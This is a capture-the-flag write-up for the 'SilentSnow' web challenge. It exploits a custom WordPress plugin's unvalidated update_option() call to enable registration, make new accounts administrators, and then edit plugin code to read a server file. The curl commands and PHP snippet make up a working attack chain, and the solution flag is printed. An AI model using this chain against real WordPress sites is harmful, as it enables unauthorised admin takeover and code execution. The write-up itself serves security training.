---
title: "UniverCTF 2025 - SilentSnow"
published: 2025-12-19
description: "WordPress arbitrary options update leading to admin takeover and RCE"
tags: ["Web", "WordPress", "Privilege Escalation", "UniverCTF"]
category: "CTF Writeups"
draft: false
---

# SilentSnow - Web CTF Challenge Writeup

**University CTF 2025: Tinsel Trouble**

## Challenge Information

- **Challenge Name:** SilentSnow
- **Category:** Web
- **Difficulty:** Medium
- **Instance:** `http://154.57.164.64:30101/`
- **Flag Format:** `HTB{...}`

## Challenge Description

The Snow-Post Owl Society website has been corrupted by malicious code, preventing the midnight delivery of festival updates. The goal is to hack the official website and bypass the corrupted code to trigger a mass resend of the latest article.

![Challenge Homepage](/images/writeups/silentsnow/homepage.png)

The challenge provides a WordPress-based application with:
- Custom theme: `my-theme`
- Custom plugin: `my-plugin`
- Docker environment with flag at `/flag.txt`

![WordPress Structure](/images/writeups/silentsnow/structure.png)

## Vulnerability Discovery

**Location:** `/src/plugins/my-plugin/my-plugin.php:110`

![Vulnerable Code](/images/writeups/silentsnow/vuln-code.png)

The code uses `$_POST['my_plugin_action']` directly as the WordPress option name in `update_option()` without any validation or sanitization. This allows an attacker to modify **ANY** WordPress option.

I found also:

### 1. Auto-login Feature

![Auto-login Feature](/images/writeups/silentsnow/autologin.png)

### 2. Admin Context Bypass

Endpoint for the settings!

![Admin Bypass](/images/writeups/silentsnow/admin-bypass.png)

Takes a GET param `settings`.

## Exploitation

### Step 1: Access the Settings Page

The plugin checks `is_admin()` which returns true when accessing files in `/wp-admin/` directory. We can access the settings page without authentication:

```bash
curl -s "http://154.57.164.79:30430/wp-admin/admin-ajax.php?settings"
```

#### Preview:

![Settings Page](/images/writeups/silentsnow/settings-page.png)

This returns the settings form with a valid nonce: `5602f77aca`

![Nonce](/images/writeups/silentsnow/nonce.png)

### Step 2: Enable User Registration

Exploit the arbitrary options update to enable user registration:

```bash
curl -s "http://154.57.164.79:30430/wp-admin/admin-ajax.php?settings" -X POST \
  -d "my_plugin_nonce=0719ac6bf4" \
  -d "_wp_http_referer=/wp-admin/admin-ajax.php?settings" \
  -d "my_plugin_action=users_can_register" \
  -d "mode=1"
```

![Enable Registration](/images/writeups/silentsnow/enable-registration.png)

**Result:** WordPress option `users_can_register` set to `1`

Mode Saved!

### Step 3: Set Default Role to Administrator

Change the default user role to administrator:

- `my_plugin_action=default_role`
- `mode=administrator`

```bash
curl -s "http://154.57.164.79:30430/wp-admin/admin-ajax.php?settings" -X POST \
  -d "my_plugin_nonce=0719ac6bf4" \
  -d "_wp_http_referer=/wp-admin/admin-ajax.php?settings" \
  -d "my_plugin_action=default_role" \
  -d "mode=administrator"
```

![Set Admin Role](/images/writeups/silentsnow/set-admin-role.png)

### Step 4: Register New Admin User

Register a new user account which will automatically become an administrator:

```bash
curl "http://154.57.164.79:30430/wp-login.php?action=register" \
  -c /tmp/cookies.txt \
  -X POST \
  -d "user_login=Daryx123" \
  -d "user_email=Daryx@test.com" \
  -L -i
```

### Step 5: Access WordPress Admin Panel

Verify admin access:

```bash
curl -b /tmp/cookies.txt "http://154.57.164.79:30430/wp-admin/"
```

Successfully authenticated as administrator!

### Step 6: Edit Plugin to Read Flag

Access the plugin editor and modify the plugin to add a flag reader endpoint:

```bash
curl -b /tmp/cookies.txt "http://154.57.164.79:30430/wp-admin/plugin-editor.php" -X POST \
  -d "nonce=5602f77aca" \
  -d "action=update" \
  -d "file=my-plugin/my-plugin.php" \
  -d "plugin=my-plugin/my-plugin.php" \
  --data-urlencode "newcontent@modified_plugin.php"
```

We use this code to get the flag read - add it to the plugin code:

```php
<?php
if (isset($_GET['getflag'])) {
    echo file_get_contents('/flag.txt');
    exit;
}
// ... rest of plugin code
```

### Step 7: Retrieve the Flag

Access the modified endpoint:

```bash
curl -s "http://154.57.164.79:30430/?getflag"
```

## Flag

```
HTB{s1l3nt_snow_b3y0nd_tinselwick_t0wn_2c13b6e5a6060cdf72ba12e1b7dfed0d}
```

## Summary

This challenge demonstrated a critical vulnerability in a custom WordPress plugin that allowed arbitrary option updates. The attack chain was:

1. **Access settings page** via `is_admin()` bypass
2. **Enable user registration** by modifying `users_can_register` option
3. **Set default role to admin** by modifying `default_role` option
4. **Register new admin account**
5. **Edit plugin code** to add flag reader
6. **Read the flag**

---

**Author:** Daryx
**Date:** 2025-12-19
**Challenge:** UniverCTF 2025 - SilentSnow
